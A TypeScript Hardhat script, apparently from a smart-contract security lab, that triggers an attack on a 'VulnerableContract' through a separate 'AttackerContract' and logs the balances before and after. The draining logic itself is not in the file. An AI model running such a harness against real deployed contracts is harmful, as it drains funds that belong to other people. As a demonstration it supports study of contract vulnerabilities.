import { ethers } from "hardhat";
import { Signer } from "ethers";
require('dotenv').config();

async function main() {

  let attacker: Signer;
  [attacker] = await ethers.getSigners();
  let attackerAddress = await attacker.getAddress();

  const vulnerableContractAddress = process.env.VULNERABLE_CONTRACT!;
  const attackerContractAddress = process.env.ATTACKER_CONTRACT!;

  console.log("VulnerableContract balance before attack:", (await ethers.provider.getBalance(vulnerableContractAddress)).toString());
  console.log("Attacker wallet balance before attack:", (await ethers.provider.getBalance(attackerAddress)).toString());

  const attackerContract = await ethers.getContractAt("AttackerContract", attackerContractAddress);

  console.log("AttackerContract balance before attack:", (await ethers.provider.getBalance(attackerContractAddress)).toString());

  // Fund the attacker's contract and initiate the attack
  const tx = await attackerContract.connect(attacker).attack({ value: ethers.parseEther("0.002") });
  const receipt = await tx.wait();
  console.log(`Gas used for attack: ${receipt!.gasUsed.toString()}`);
                        
  console.log("VulnerableContract balance after attack:", (await ethers.provider.getBalance(vulnerableContractAddress)).toString());
  console.log("Attacker wallet balance after attack:", (await ethers.provider.getBalance(attackerAddress)).toString());
  console.log("AttackerContract balance after attack:", (await ethers.provider.getBalance(attackerContractAddress)).toString());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});